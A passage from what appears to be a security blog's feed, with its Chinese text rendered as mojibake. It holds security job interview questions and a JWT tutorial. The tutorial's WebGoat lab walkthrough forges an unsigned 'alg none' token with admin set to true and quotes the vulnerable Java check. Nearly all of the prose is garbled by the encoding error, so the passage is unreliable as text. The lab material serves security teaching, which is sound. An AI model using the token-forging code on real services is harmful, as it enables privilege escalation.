çš„æ€è·¯å’Œåšæ³•æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆæ­¤å¤„å†™æ˜ä½ ä¼šä½¿ç”¨åˆ°çš„å·¥å…·çš„åç§°ã€‚æ¯”å¦‚ä¸è¦åªè¯´â€œä½¿ç”¨å·¥å…·è¿›è¡Œæ¼æ´æ‰«æâ€ï¼Œå…·ä½“åˆ°ï¼šâ€œä½¿ç”¨xxxå·¥å…·è¿›è¡Œæ¼æ´æ‰«æâ€ ï¼‰</p></li><li><p>è·å–åˆ°è¾¹ç•ŒæœåŠ¡å™¨çš„æƒé™åï¼Œæœ‰å“ªäº›æ–¹æ³•å¯ä»¥å¿«é€Ÿæ‰¾å‡ºå†…ç½‘ä¸­å¯èƒ½å­˜æ´»çš„ä¸»æœº</p></li><li><p>Windowså’ŒLinuxä½¿ç”¨å‘½ä»¤è¡Œä¸‹è½½æ–‡ä»¶çš„æ–¹å¼åˆ†åˆ«æœ‰å“ªäº›ï¼Ÿï¼ˆå¯ä»¥åªå†™å‘½ä»¤çš„åç§°ï¼Œä¸ç”¨å†™å…¨å‘½ä»¤å®Œæ•´å‚æ•°ï¼‰</p></li><li><p>æè¿°ä½ å¸¸ç”¨çš„ç«¯å£è½¬å‘åŠä»£ç†éš§é“çš„æ­å»ºæ–¹å¼</p></li><li><p>xrayæ˜¯å“ªå®¶å…¬å¸å¼€å‘çš„ï¼Œæ˜¯ç”¨ä»€ä¹ˆè¯­è¨€ç¼–å†™çš„ï¼Ÿgobyæ˜¯å“ªå®¶å…¬å¸å¼€å‘çš„ï¼Œæ˜¯ç”¨ä»€ä¹ˆè¯­è¨€å†™çš„ï¼Ÿ</p></li><li><p>æè¿°ä¸€ä¸‹ä½ çš„ä¼˜åŠ¿ ï¼Œä»¥åŠèƒ½ä¸ºå…¬å¸åˆ›é€ ä»€ä¹ˆä»·å€¼</p></li><li><p>è¯·è°ˆä¸€è°ˆä½ çš„èŒä¸šè§„åˆ’</p></li><li><p>è¯·ä»‹ç»ä¸‹ä½ çš„æ€§æ ¼</p></li><li><p>è¯·ä»‹ç»ä¸€ä¸‹ä½ å¯¹äºç½‘ç»œå®‰å…¨å­¦ä¹ çš„çƒ­æƒ…</p></li></ul><h1 id="å®‰æœ-x2F-æ¸—é€ç¬”è¯•"><a href="#å®‰æœ-x2F-æ¸—é€ç¬”è¯•" class="headerlink" title="å®‰æœ&#x2F;æ¸—é€ç¬”è¯•"></a>å®‰æœ&#x2F;æ¸—é€ç¬”è¯•</h1><blockquote><p>ç»¿ç›Ÿ80é¢˜ï¼Œå…¶ä¸­ä¸å®šé¡¹é€‰æ‹©é¢˜å°‘é€‰ï¼Œé”™é€‰éƒ½ä¸å¾—åˆ†ï¼Œ10é“ç®€ç­”é¢˜</p><p>æ·±ä¿¡æœ30é“é€‰æ‹©é¢˜</p><p>å¥‡å®‰ä¿¡40é“é€‰æ‹©é¢˜</p><p>äºšä¿¡25é“é€‰æ‹©é¢˜ï¼Œ10é“ç®€ç­”é¢˜</p></blockquote><p><strong>é€‰æ‹©é¢˜</strong></p><ul><li>Webå®‰å…¨</li><li>åº”æ€¥å“åº”</li><li>Linux</li><li>è®¡ç®—æœºç½‘ç»œ</li><li>Androidæ¸—é€ç›¸å…³ï¼ˆç»¿ç›Ÿï¼‰</li><li>å¯†ç å­¦ç›¸å…³ï¼ˆç»¿ç›Ÿï¼Œå…¶ä»–çš„ä¹Ÿæœ‰è€ƒä¸€ç‚¹ï¼‰</li></ul><p><strong>ç®€ç­”é¢˜</strong></p><ul><li>å†…ç½‘ï¼šä¿¡æ¯æ”¶é›†ï¼Œéš§é“æ­å»ºï¼Œå†…ç½‘å¤§ä½“æ€è·¯</li><li>å¤–ç½‘ï¼šç‰¹å®šåœºæ™¯ä¸‹çš„æ¸—é€æ€è·¯</li><li>ä¸ªäººç‰¹ç‚¹å’ŒèŒä¸šè§„åˆ’ï¼ˆäºšä¿¡ï¼‰</li><li>é¡¹ç›®å®æ–½ï¼ˆäºšä¿¡ï¼‰</li><li>Javaä»£ç å®¡è®¡ï¼ˆç»¿ç›Ÿï¼‰</li><li>åº”æ€¥å“åº”æ€è·¯ï¼ˆç»¿ç›Ÿï¼‰</li><li>æ¶æ„æ ·æœ¬åˆ†ææ€è·¯ï¼ˆç»¿ç›Ÿï¼‰</li></ul><h1 id="å®‰æœé¢è¯•"><a href="#å®‰æœé¢è¯•" class="headerlink" title="å®‰æœé¢è¯•"></a>å®‰æœé¢è¯•</h1><blockquote><p>ç»¿ç›Ÿè¦æ±‚é«˜ï¼Œæ„Ÿè§‰å•¥éƒ½è¦ä¼šï¼Œæ¯æ¬¡éƒ½é—®æˆ‘å…¥èŒå®ä¹ èƒ½ä¸èƒ½æ¥ï¼Ÿï¼Ÿ</p><p>æ·±ä¿¡æœæ²¡å’‹é—®æŠ€æœ¯å‹é—®é¢˜ï¼Œæ›´çœ‹é‡çš„æ˜¯ä½ çš„è½¯å®åŠ›ï¼Œæ¯”å¦‚å®‰å…¨è¡Œä¸šè®¤çŸ¥ï¼Œå­¦ä¹ æ–¹æ³•ï¼Œæ€§æ ¼å“è´¨ç­‰æ˜¯å¦åŒ¹é…</p></blockquote><h2 id="ç»¿ç›Ÿä¸€é¢"><a href="#ç»¿ç›Ÿä¸€é¢" class="headerlink" title="ç»¿ç›Ÿä¸€é¢"></a>ç»¿ç›Ÿä¸€é¢</h2><p>30min</p><ul><li>è‡ªæˆ‘ä»‹ç»</li><li>åšè¿‡å“ªäº›ç³»ç»Ÿ</li><li>æ¯”è¾ƒéš¾å¿˜çš„æ¸—é€æµ‹è¯•ç»å†æˆ–è€…è¯´å­¦åˆ°ä¸œè¥¿çš„</li><li>shiroæ˜¯ä»€ä¹ˆ</li><li>shiroæƒé™ç»•è¿‡çš„åŸç†</li><li>shiroæƒé™æ ¡éªŒæ˜¯æ€ä¹ˆåšçš„ï¼Œçœ‹è¿‡ç›¸å…³ä»£ç å—</li><li>è®²è®²å…¶ä»–è¶Šæƒ</li><li>æ€ä¹ˆåšæƒé™ç»•è¿‡çš„ä¿®å¤ï¼ˆé¢è¯•å®˜è¿˜å¼•å¯¼äº†å¾ˆå¤šï¼Œå¤ªèœäº†å…·ä½“çš„å®ç°ä¸ä¼šï¼‰</li><li>å¸¸è§wafç»•è¿‡çš„æ–¹å¼</li><li>æ–‡ä»¶ä¸Šä¼ å“ªä¸€ä¸ªç‚¹å¯ä»¥å°è¯•ç»•è¿‡waf</li><li>APPæ¸—é€IOSçš„æ¥è§¦è¿‡å˜›</li><li>APPæœ‰å£³æ€ä¹ˆåŠ</li><li>APPæµ‹è¯•è®²ä¸€ä¸‹ï¼Œå®¢æˆ·ç«¯å’Œæœ¬åœ°ç«¯æ¥è®²</li><li>æŠ“åŒ…æ€ä¹ˆæŠ“çš„</li><li>HTTPåŒå‘è®¤è¯æ€ä¹ˆç»•è¿‡</li><li>åé—®</li></ul><h2 id="ç»¿ç›ŸäºŒé¢"><a href="#ç»¿ç›ŸäºŒé¢" class="headerlink" title="ç»¿ç›ŸäºŒé¢"></a>ç»¿ç›ŸäºŒé¢</h2><p>45min</p><ul><li>è‡ªæˆ‘ä»‹ç»</li><li>æ¸—é€å®ä¹ å¹²äº†å•¥</li><li>å¯¹é‡‘èå’Œèƒ½æºè¡Œä¸šçš„å…¬å¸æ¸—é€æœ‰æ²¡æœ‰è‡ªå·±çš„ä¸€äº›å¿ƒå¾—ï¼ˆå›ç­”äº†åï¼Œé—®ä½ è¿™ä¸ªæ˜¯æ‰“ç‚¹å—ï¼Ÿï¼‰</li><li>å†…ç½‘æ¸—é€æœ‰å®é™…åšè¿‡å—ï¼ˆå®ä¹ ç”Ÿæ²¡ç»™åˆ†é…åšğŸ˜…ï¼‰</li><li>ç»™ä½ ä¸€ä¸ªç³»ç»Ÿï¼Œä½ è§‰å¾—è¦ä»å“ªå‡ ä¸ªæ–¹é¢è¿›è¡Œæµ‹è¯•</li><li>è°ˆè°ˆå¯¹å®‰å…¨æœåŠ¡çš„äº†è§£ï¼ˆç­”å®Œé¢è¯•å®˜è¯´å¯¹å®‰å…¨æœåŠ¡çš„ç†è§£å¤ªæµ…äº†ã€‚ã€‚ï¼‰</li><li>SRCæœ‰æ²¡æœ‰æ¯”è¾ƒå¥½çš„æ’å</li><li>ä½ è¿™ä¸ªCTFæ‹¿çš„å¥–æ¨ªå‘å¯¹æ¯”æœ‰ç‚¹å°‘ï¼Œæ˜¯æœ‰ä»€ä¹ˆåŸå› å—ï¼ˆä¸æ˜¯æˆ‘å°±æ‰“äº†ä¸€å¹´ï¼Œå¤§å®¶ç§¯ææ€§ä¹Ÿä¸å¤Ÿï¼Œæˆ‘æœ‰å•¥åŠæ³•ğŸ˜­ï¼‰</li><li>ä¼šä»£ç å®¡è®¡å—ï¼Œæœ‰æ²¡æœ‰è‡ªå·±å®¡å‡ºè¿‡0Day</li><li>è®²è®²æŒ–SRCæˆ–è€…å®ä¹ æ—¶å€™å°è±¡æ¯”è¾ƒæ·±åˆ»çš„ä¸¤ä¸ªæ´</li><li>ç†Ÿæ‚‰å“ªç§æ•°æ®åº“ï¼Œè®²è®²è¿™ä¸ªæ•°æ®åº“sqlæ³¨å…¥ç»•è¿‡wafçš„æ–¹å¼</li><li>ç”¨pythonå†™è¿‡ä»€ä¹ˆè„šæœ¬</li><li>è®²è®²å°ç¨‹åºçš„æ¸—é€</li><li>fastjsonäº†è§£å—</li><li>fastjsonä¸å‡ºç½‘æ€ä¹ˆåˆ©ç”¨</li><li>åé—®ç¯èŠ‚</li></ul><h2 id="æ·±ä¿¡æœä¸€é¢"><a href="#æ·±ä¿¡æœä¸€é¢" class="headerlink" title="æ·±ä¿¡æœä¸€é¢"></a>æ·±ä¿¡æœä¸€é¢</h2><p>çº¿ä¸‹30min</p><blockquote><p>çº¿ä¸‹é…’åº—ç¯å¢ƒä¸é”™ï¼Œä¸è¿‡çœ‹åˆ°å…¶ä»–å²—ä½ç¾¤é¢æœ‰ç‚¹å“ˆäºº</p><p>å®‰æœå•é¢èŠçš„æŒºå¼€å¿ƒğŸ¤£ï¼Œè®°å¾—çš„å°±è¿™äº›</p></blockquote><ul><li>è‡ªæˆ‘ä»‹ç»</li><li>ä½ åœ¨å­¦æ ¡é‡Œæœ‰å½“è¿‡ä»€ä¹ˆèŒä½å—ï¼Ÿ</li><li>å¿—æ„¿æ´»åŠ¨ä¸­æœ‰æ²¡æœ‰ä»€ä¹ˆè®©ä½ æ¯”è¾ƒå°è±¡æ·±åˆ»çš„äº‹æƒ…</li><li>ä½ æœ‰æ²¡æœ‰æƒ³è¿‡ä»–ä»¬çš„èµ„é‡‘æ¥æºæ˜¯ä»€ä¹ˆå‘¢</li><li>ä½ é€šè¿‡å“ªäº›æ–¹æ³•æ¥è¿›è¡Œå­¦ä¹ ï¼Ÿ</li><li>ä½ é™¤äº†å†™åšå®¢ï¼Œè¿˜æœ‰æ²¡æœ‰åœ¨ä¸€äº›ç¤¾åŒºæŠ•ç¨¿æ–‡ç« çš„</li><li>äº¤æ¢æœºä¸è·¯ç”±å™¨æ˜¯ä»€ä¹ˆ</li><li>ä»£ç å®¡è®¡ä½ ä¼šå“ªäº›è¯­è¨€ï¼Œç„¶åç»™äº†å‡ è¡ŒPHPä»£ç è®©ä½ ç°åœºå®¡è®¡ï¼ˆæ‰“è¿‡CTFçš„ä¸€çœ¼å°±ä¼šå¾ˆç®€å•ï¼‰</li><li>è®²ä¸€ä¸‹å¤–ç½‘æ€è·¯ï¼ˆæœ‰ç‚¹å¿˜äº†ï¼Œåæ­£æ˜¯è·Ÿçº¢é˜Ÿæœ‰å…³ï¼‰</li><li>åé—®ç¯èŠ‚</li></ul><h2 id="æ·±ä¿¡æœäºŒé¢"><a href="#æ·±ä¿¡æœäºŒé¢" class="headerlink" title="æ·±ä¿¡æœäºŒé¢"></a>æ·±ä¿¡æœäºŒé¢</h2><p>45min</p><blockquote><p>è®°ä¸å¤§å¾—</p></blockquote><ul><li><p>è‡ªæˆ‘ä»‹ç»ï¼ˆè®²è®²åœ¨å­¦æ ¡çš„å­¦ä¹ ç»å†å’Œè¿™ä¸ªå®ä¹ ç»å†ï¼‰</p></li><li><p>ä½ æ˜¯ä¿¡æ¯å®‰å…¨ä¸“ä¸šçš„ï¼Ÿ</p></li><li><p>ä¸ºä»€ä¹ˆè¦è½¬ä¸“ä¸šå‘¢ï¼Ÿ</p></li><li><p>é™¤äº†å…´è¶£è¿˜æœ‰ä»€ä¹ˆåŸå› å‘¢ï¼Ÿæ¯”å¦‚è¯´è–ªé…¬ä¹‹ç±»çš„</p></li><li><p>ä½ æœ‰ä»€ä¹ˆèŒä¸šè§„åˆ’å—ï¼Ÿ</p></li><li><p>ä½ è¯¾ä½™æ—¶é—´ä¼šåšä»€ä¹ˆï¼Ÿ</p></li><li><p>ä½ åœ¨å­¦æ ¡æˆ–è€…å®ä¹ ä¸­é‡åˆ°çš„æœ€å¤§çš„å›°éš¾æ˜¯ä»€ä¹ˆï¼Ÿ</p></li><li><p>å¦‚æœå’Œåˆ«äººå‘ç”Ÿäº†å†²çªï¼Œä½ ä¼šæ€ä¹ˆåšï¼Ÿ</p></li><li><p>è¯´ä¸€ä¸‹ä½ çš„ä¼˜ç¼ºç‚¹ï¼Œå„è¯´2-3ä¸ª</p></li><li><p>ä½ é€šè¿‡å“ªäº›æ–¹æ³•æ¥è¿›è¡Œå­¦ä¹ ï¼Ÿ</p></li><li><p>ä½ å¯¹æˆ‘ä»¬å…¬å¸çš„ä¸šåŠ¡æœ‰ä»€ä¹ˆäº†è§£å—ï¼Ÿ</p></li><li><p>åé—®ç¯èŠ‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWTå®‰å…¨</title>
      <link href="/2023/06/01/JWT%E4%BB%A4%E7%89%8C/"/>
      <url>/2023/06/01/JWT%E4%BB%A4%E7%89%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="JWTè®¤è¯†"><a href="#JWTè®¤è¯†" class="headerlink" title="JWTè®¤è¯†"></a>JWTè®¤è¯†</h1><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>JSON Web Tokenï¼ˆJSON Web ä»¤ç‰Œï¼‰æ˜¯ä¸€ç§è·¨åŸŸéªŒè¯èº«ä»½çš„æ–¹æ¡ˆã€‚JWT ä¸åŠ å¯†ä¼ è¾“çš„æ•°æ®ï¼Œä½†èƒ½å¤Ÿé€šè¿‡æ•°å­—ç­¾åæ¥éªŒè¯æ•°æ®æœªè¢«ç¯¡æ”¹ã€‚</p><h2 id="ä»¤ç‰Œå·¥ä½œæµç¨‹"><a href="#ä»¤ç‰Œå·¥ä½œæµç¨‹" class="headerlink" title="ä»¤ç‰Œå·¥ä½œæµç¨‹"></a>ä»¤ç‰Œå·¥ä½œæµç¨‹</h2><p><img src="/../images/jwt-diagram.png" alt="jwt"></p><ol><li>æµè§ˆå™¨å‘èµ·è¯·æ±‚ç™»é™†</li><li>æœåŠ¡ç«¯éªŒè¯èº«ä»½ï¼Œæ ¹æ®ç®—æ³•ï¼Œå°†ç”¨æˆ·æ ‡è¯†ç¬¦æ‰“åŒ…ç”Ÿæˆ token, å¹¶ä¸”è¿”å›ç»™æµè§ˆå™¨</li><li>æµè§ˆå™¨å‘èµ·è¯·æ±‚è·å–ç”¨æˆ·èµ„æ–™ï¼ŒæŠŠåˆšåˆšæ‹¿åˆ°çš„ token ä¸€èµ·å‘é€ç»™æœåŠ¡å™¨</li><li>æœåŠ¡å™¨å‘ç°æ•°æ®ä¸­æœ‰ tokenï¼ŒéªŒè¯ç­¾åå¹¶è¯†åˆ«ç”¨æˆ·èº«ä»½</li><li>æœåŠ¡å™¨è¿”å›è¯¥ç”¨æˆ·çš„ç”¨æˆ·èµ„æ–™</li></ol><h2 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h2><p>JWT åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œå¤´éƒ¨ï¼ˆHeaderï¼‰ï¼Œå£°æ˜ï¼ˆClaimsï¼‰ï¼Œç­¾åï¼ˆSignatureï¼‰ï¼Œä¸‰ä¸ªéƒ¨åˆ†ä»¥è‹±æ–‡å¥å·.éš”å¼€ã€‚ </p><p><img src="/../images/jwt_token.png" alt="JWT"></p><p>hearderå’ŒClaims çš„å†…å®¹ä»¥ Base64URL è¿›è¡Œäº†ç¼–ç ã€‚</p><blockquote><p>Base64URL  From ç»´åŸºç™¾ç§‘</p></blockquote><p><img src="/../images/image-20230607163309054.png" alt="image-20230607163309054"></p><h3 id="å¤´éƒ¨ï¼ˆHeaderï¼‰"><a href="#å¤´éƒ¨ï¼ˆHeaderï¼‰" class="headerlink" title="å¤´éƒ¨ï¼ˆHeaderï¼‰"></a>å¤´éƒ¨ï¼ˆHeaderï¼‰</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span><span class="string">&quot;webgoat_key&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜:</p><ul><li>algorithmï¼ˆalgï¼‰ :è¯´æ˜JWTç­¾åä½¿ç”¨çš„ç®—æ³•ï¼Œå¸¸è§æœ‰HS256ï¼ˆé»˜è®¤ï¼‰ï¼ŒRS256 ç­‰ï¼Œä¹Ÿå¯ä»¥ä¸º Noneä¸è¿›è¡Œç­¾åã€‚</li><li>kidï¼šç”¨æ¥æŒ‡å®šéªŒè¯ç­¾åçš„å¯†é’¥</li><li>typ:è¯´æ˜è¿™ä¸ª token çš„ç±»å‹ä¸º JWT (å¯é€‰å‚æ•°)</li></ul><h3 id="å£°æ˜ï¼ˆClaimsï¼‰"><a href="#å£°æ˜ï¼ˆClaimsï¼‰" class="headerlink" title="å£°æ˜ï¼ˆClaimsï¼‰"></a>å£°æ˜ï¼ˆClaimsï¼‰</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"> <span class="attr">&quot;secretid&quot;</span><span class="punctuation">:</span><span class="string">&quot; &quot;</span></span><br><span class="line"> <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1644039735</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1644039795</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tom@webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span>xxx</span><br><span class="line"><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li>secretidï¼šå¯†é’¥idå€¼ï¼Œå½“å…¶ä¸ºç©ºæ—¶ï¼Œjwté»˜è®¤algä¸ºnone</li><li>audï¼šæ¥æ”¶jwtçš„ç”¨æˆ·</li><li>iatï¼šä»¤ç‰Œç”Ÿæ•ˆæ—¶é—´ </li><li>expï¼šä»¤ç‰Œåˆ°æœŸæ—¶é—´</li><li>subï¼šä¸»é¢˜</li><li>jtiï¼š jwtçš„å”¯ä¸€èº«ä»½æ ‡è¯†ï¼Œä¸»è¦ç”¨æ¥ä½œä¸ºä¸€æ¬¡æ€§token,ä»è€Œå›é¿é‡æ”¾æ”»å‡»</li><li>nbfï¼šå®šä¹‰åœ¨ä»€ä¹ˆæ—¶é—´ä¹‹å‰ï¼Œè¯¥jwtéƒ½æ˜¯ä¸å¯ç”¨çš„.</li></ul><p> æ–‡æ¡£ï¼š<a href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1">https://datatracker.ietf.org/doc/html/rfc7519#section-4.1</a></p><h3 id="ç­¾åï¼ˆSignatureï¼‰"><a href="#ç­¾åï¼ˆSignatureï¼‰" class="headerlink" title="ç­¾åï¼ˆSignatureï¼‰"></a>ç­¾åï¼ˆSignatureï¼‰</h3><p>â€‹æœåŠ¡å™¨æœ‰ä¸€ä¸ªä¸ä¼šå‘é€ç»™å®¢æˆ·ç«¯çš„å¯†ç ï¼ˆsecretï¼‰ï¼Œç”¨å¤´éƒ¨ä¸­æŒ‡å®šçš„ç®—æ³•å¯¹å¤´éƒ¨å’Œå£°æ˜çš„å†…å®¹ï¼ˆbase64ç¼–ç åçš„ï¼‰ç”¨æ­¤å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²å°±æ˜¯ JWT çš„ç­¾åã€‚ </p><p>ä»¥HMAC SHA256ä¸ºä¾‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(claims),secret)</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>åœ¨http headerä¸­æ·»åŠ </p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><h2 id="å®‰å…¨æ€§"><a href="#å®‰å…¨æ€§" class="headerlink" title="å®‰å…¨æ€§"></a>å®‰å…¨æ€§</h2><ul><li><p>é˜²ç¯¡æ”¹å–å†³äºç§é’¥å’ŒåŠ å¯†ç®—æ³•çš„å®‰å…¨æ€§ã€‚</p></li><li><p>å› ä¸ºç­¾åæ‰€ä»¥JWTèƒ½å¤Ÿé˜²ç¯¡æ”¹èµ·åˆ°è®¤è¯åŠŸèƒ½ï¼Œä½†æ˜¯å¯¹äºheaderå’ŒClaimséƒ¨åˆ†åªè¿›è¡Œäº†base64URLç¼–ç ï¼Œè¿™æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥è¯»å–åˆ°è¿™éƒ¨åˆ†çš„ä¿¡æ¯ï¼Œæ‰€ä»¥é™¤éåŠ å¯†ï¼Œå¦åˆ™ä¸è¦åœ¨JWTçš„æœ‰æ•ˆè´Ÿè½½æˆ–æŠ¥å¤´å…ƒç´ ä¸­æ”¾ç½®ç§˜å¯†ä¿¡æ¯ã€‚</p></li></ul><h1 id="å¦‚ä½•ç”ŸæˆJWT"><a href="#å¦‚ä½•ç”ŸæˆJWT" class="headerlink" title="å¦‚ä½•ç”ŸæˆJWT"></a>å¦‚ä½•ç”ŸæˆJWT</h1><ul><li><p>ç­¾åè§£æç½‘ç«™ <a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p></li><li><p>python</p><p>å®‰è£…æ¨¡å—</p><p><a href="https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode">https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip uninstall JWT </span><br><span class="line">pip uninstall PyJWT </span><br><span class="line">pip install PyJWT==<span class="number">1.7</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># è°ƒç”¨jwtåº“,ç”Ÿæˆjson web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=payload,  <span class="comment"># payload, æœ‰æ•ˆè½½ä½“</span></span><br><span class="line">                       key=key,  <span class="comment"># è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token æ•°æ®ç»“æ„åŒ…å«ä¸¤éƒ¨åˆ†, payload(æœ‰æ•ˆè½½ä½“), headers(æ ‡å¤´)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 ç¼–ç åå¾—åˆ° bytes, å†è¿›è¡Œè§£ç (æŒ‡æ˜è§£ç çš„æ ¼å¼), å¾—åˆ°ä¸€ä¸ªstr</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure></li></ul><h1 id="JWTæ£€æµ‹"><a href="#JWTæ£€æµ‹" class="headerlink" title="JWTæ£€æµ‹"></a>JWTæ£€æµ‹</h1><ul><li><p>JAVAweb</p></li><li><p>æ•°æ®åŒ…è¯·æ±‚å¤´</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer</span><br></pre></td></tr></table></figure></li><li><p>æ•°æ®åŒ…æ•°æ®æ ¼å¼</p></li></ul><h1 id="æ”»å‡»æ‰‹æ®µ"><a href="#æ”»å‡»æ‰‹æ®µ" class="headerlink" title="æ”»å‡»æ‰‹æ®µ"></a>æ”»å‡»æ‰‹æ®µ</h1><h3 id="ç­¾åç®—æ³•ç½®None"><a href="#ç­¾åç®—æ³•ç½®None" class="headerlink" title="ç­¾åç®—æ³•ç½®None"></a>ç­¾åç®—æ³•ç½®None</h3><h4 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><p>WebGoat JWT 5</p><p><img src="/../images/image-20230607173309475.png" alt="image-20230607173309475"></p><p>ç‚¹å‡»resetæŒ‰é’®ï¼ŒæŠ“å–æ•°æ®åŒ…ï¼Œå°†æ•°æ®åŒ…ä¸­çš„tokenè¿›è¡Œè§£å¯†</p><p><img src="/../images/image-20230607173408930.png" alt="image-20230607173408930"></p><p>å‘ç°åœ¨å£°æ˜éƒ¨åˆ†æœ‰adminå‚æ•°å€¼ä¸ºfalseï¼Œåº”è¯¥å°±æ˜¯æ ¹æ®è¿™ä¸ªæ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜</p><p><strong>å°†adminå€¼ä¿®æ”¹ä¸ºtrue</strong></p><p>è¿™æ—¶å€™ä¿®æ”¹äº†å£°æ˜éƒ¨åˆ†çš„å†…å®¹ï¼Œç­¾åå°±å¤±æ•ˆäº†ï¼Œæ‰€ä»¥è¦ç»•è¿‡ç­¾åéªŒè¯</p><p><strong>å°†å¤´éƒ¨algå€¼æ”¹ä¸ºnoneï¼Œè®©æœåŠ¡å™¨ä¸è¿›è¡Œç­¾åéªŒè¯</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686993728</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;Jerry&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607174127468.png" alt="image-20230607174127468"></p><h4 id="å½¢æˆåŸå› "><a href="#å½¢æˆåŸå› " class="headerlink" title="å½¢æˆåŸå› "></a>å½¢æˆåŸå› </h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">   <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isAdmin</span> <span class="operator">=</span> Boolean.valueOf((String) claims.get(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">   <span class="keyword">if</span> (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     log.error(<span class="string">&quot;You are not an admin user&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title 